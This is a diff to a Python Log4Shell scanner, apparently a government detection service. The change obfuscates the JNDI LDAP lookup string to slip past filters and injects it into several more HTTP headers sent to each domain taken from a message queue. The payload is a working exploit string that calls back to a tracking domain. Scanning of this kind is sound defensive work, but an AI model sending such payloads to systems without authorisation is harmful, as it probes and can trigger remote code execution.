@@ -9,6 +9,7 @@ import os
 import signal
 import traceback
 import hashlib
+from timedsocket import socket
 import random
 import string
 import datetime as dt
@@ -21,7 +22,7 @@ urllib3.disable_warnings()
 
 logging.basicConfig(stream=sys.stdout, level=logging.INFO)
 
-TIMEOUT = int(os.getenv("TIMEOUT", 1))
+TIMEOUT = float(os.getenv("TIMEOUT", 1.0))
 NAME = os.getenv("NAME", "log4shell-scanner")
 SUBSCRIBE_TO = os.getenv("SUBSCRIBE_TO")
 PUBLISH_TO = os.getenv("PUBLISH_TO")
@@ -39,15 +40,32 @@ def randomword(length):
 def payload(domain, header):
     hashed_domain = hashlib.md5(domain.encode('utf-8')).hexdigest()
     encoded_header = base64.b64encode(header.encode('utf-8')).decode('utf-8').rstrip('=')
-    return "${jndi:ldap://" + f"{hashed_domain}.{encoded_header}" + "t.log4shell.tracker.alpha.canada.ca}"
+    payload = "${${::-j}${::-n}${lower:D}i:l${::-d}${::-a}${lower:P}://" + f"{hashed_domain}.{encoded_header}" + ".t.log4shell.tracker.alpha.canada.ca}"
+    print({'domain': domain, 'header': header, 'payload': payload})
+    return payload
 
 def log4shell(domain):
     fakedomain = randomword(10)
     try:
-        headers = {'User-Agent':payload(fakedomain, "User-Agent"), 'Referer':payload(fakedomain, "Referer"), 'X-Api-Version': payload(fakedomain, "X-Api-Version")}
+        headers = {
+            'User-Agent':payload(fakedomain, "User-Agent"),
+            'Referer':payload(fakedomain, "Referer"),
+            'X-Api-Version': payload(fakedomain, "X-Api-Version"),
+            'X-Csrf-Token': payload(fakedomain, 'X-Csrf-Token'),
+            'X-CSRFToken': payload(fakedomain, 'X-CSRFToken'),
+            'X-Forwarded-For': payload(fakedomain, 'X-Forwarded-For'),
+            'Cookie': payload(fakedomain, 'Cookie'),
+        }
         response = requests.get(f"http://{domain}", headers=headers, timeout=TIMEOUT)
+        # response = requests.get(f"http://{domain}", timeout=TIMEOUT)
+        response.raise_for_status()
+        print(f"response: {response.status_code}")
+
         if not response.url.startswith('https'):
+            print("response ended with http")
+            # response = requests.get(f"http://{domain}", timeout=TIMEOUT)
             response = requests.get(f"https://{domain}", headers=headers, verify=False, timeout=TIMEOUT)
+            response.raise_for_status()
         to_json({'domain': domain, 'status': response.status_code, 'redirects': list(map(lambda res: res.url, response.history))})
     except requests.exceptions.HTTPError as e:
         to_json({'exception': True, 'status': e.response.status_code, 'reason': e.response.reason})
@@ -80,11 +98,6 @@ async def run(loop):
         subject = msg.subject
         reply = msg.reply
         data = msg.data.decode()
-        print(
-            "Received a message on '{subject} {reply}': {data}".format(
-                subject=subject, reply=reply, data=data
-            )
-        )
         payload = json.loads(msg.data)
 
         domain = payload["domain"]
